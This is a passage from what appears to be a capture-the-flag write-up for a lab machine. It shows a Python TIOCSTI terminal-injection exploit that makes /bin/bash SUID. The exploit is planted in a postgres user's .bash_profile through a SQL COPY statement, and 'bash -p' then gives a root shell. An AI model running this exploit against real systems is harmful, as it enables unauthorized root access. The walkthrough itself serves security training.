+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">signal</span>
+
+<span class="n">os</span><span class="o">.</span><span class="n">kill</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getppid</span><span class="p">(),</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIGSTOP</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">:</span>
+    <span class="n">fcntl</span><span class="o">.</span><span class="n">ioctl</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">termios</span><span class="o">.</span><span class="n">TIOCSTI</span><span class="p">,</span> <span class="n">char</span><span class="p">)</span>
+</pre></div>
+
+I modified it to make it work on the victim machine:<br/><br/>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">fcntl</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">termios</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+
+    <span class="n">x</span> <span class="o">=</span> <span class="s2">"exit</span><span class="se">\n</span><span class="s2">/bin/bash -c 'chmod u+s /bin/bash'</span><span class="se">\n</span><span class="s2">"</span>
+    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">x</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">ret</span> <span class="o">=</span> <span class="n">fcntl</span><span class="o">.</span><span class="n">ioctl</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">termios</span><span class="o">.</span><span class="n">TIOCSTI</span><span class="p">,</span> <span class="n">char</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">ret</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+                <span class="nb">print</span><span class="p">(</span><span class="s2">"ioctl()"</span><span class="p">)</span>
+        <span class="k">except</span> <span class="ne">OSError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"ioctl(): </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</pre></div>
+
+If all works well, after executing this exploit, the <code>/bin/bash</code> will become <code>Set-UID</code>, and we will be able to use the <code>-p</code> parameter to run commands as root.<br/><br/>
+Let's copy the exploit to the <code>/dev/shm</code> directory:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">cp</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span>
+</pre></div>
+
+Now, let's modify the <code>.bash_profile</code> of the <code>Postgres</code> user:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">download</span><span class="o">=&gt;</span> <span class="n">COPY</span> <span class="p">(</span><span class="n">SELECT</span> <span class="s1">'python3 /dev/shm/exploit.py'</span><span class="p">)</span> <span class="n">TO</span> <span class="s1">'/var/lib/postgresql/.bash_profile'</span><span class="p">;</span>
+<span class="n">COPY</span> <span class="mi">1</span>
+<span class="n">download</span><span class="o">=&gt;</span>
+</pre></div>
+
+After a short wait, let's list the privileges of <code>/bin/bash</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">1183448</span> <span class="n">Apr</span> <span class="mi">18</span>  <span class="mi">2022</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span>
+</pre></div>
+
+It is <code>Set-UID</code>, so let's execute <code>bash -p</code> and subsequently read the last flag:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">bash</span> <span class="o">-</span><span class="n">p</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="root1">#</span><span class="n"> cd /root</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="root1">#</span><span class="n"> cat root.txt</span>
+<span class="n">fb5e5</span><span class="o">**********************</span><span class="mi">96</span><span class="n">b50</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="root1">#</span>
+</pre></div></br></br></br></br></br></br>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <p>&copy; 2023 elswix.github.io</p>
+    </footer>
+</body>
+</html>
